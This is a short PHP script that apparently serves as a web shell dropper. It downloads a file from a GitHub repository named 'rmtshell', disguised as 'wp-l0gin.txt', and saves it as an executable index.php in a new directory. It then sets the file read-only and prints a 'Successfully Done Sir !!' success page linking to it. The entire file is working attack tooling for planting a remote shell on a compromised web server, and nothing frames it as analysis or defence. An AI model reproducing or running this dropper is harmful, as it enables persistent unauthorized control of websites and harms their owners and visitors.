<?php
$url = 'https://raw.githubusercontent.com/uidr00t/rmtshell/main/wp-l0gin.txt'; // URL of the file to download
$dir = 'xt'; // Directory to save the file
$filename = 'index.php'; // Name of the downloaded file

// Check if the "rex" directory exists, and create it if not
if (!is_dir($dir)) {
    if (!mkdir($dir, 0755, true)) {
        die('Failed to create the "rex" directory.');
    }
}

// Set the full path to the downloaded file
$file_path = $dir . '/' . $filename;

// Download the file and save it to the "rex" directory
$file_contents = @file_get_contents($url); // Suppress errors for simplicity

if ($file_contents !== false) {
    if (@file_put_contents($file_path, $file_contents) !== false) {
        // Set file permissions (e.g., read-only)
        if (chmod($file_path, 0444)) {
            echo '<div style="display: flex; justify-content: center; align-items: center; height: 100vh;">';
            echo '<h1 style="text-align: center;">Successfully Done Sir !! <a href="' . $file_path . '" target="_blank">File Link ' . $filename . '</a></h1>';
            echo '</div>';
        } else {
            echo 'Failed to set file permissions.';
        }
    } else {
        echo 'Failed to save the file to the "rex" directory.';
    }
} else {
    echo 'Failed to download the file from the provided URL.';
}
?>
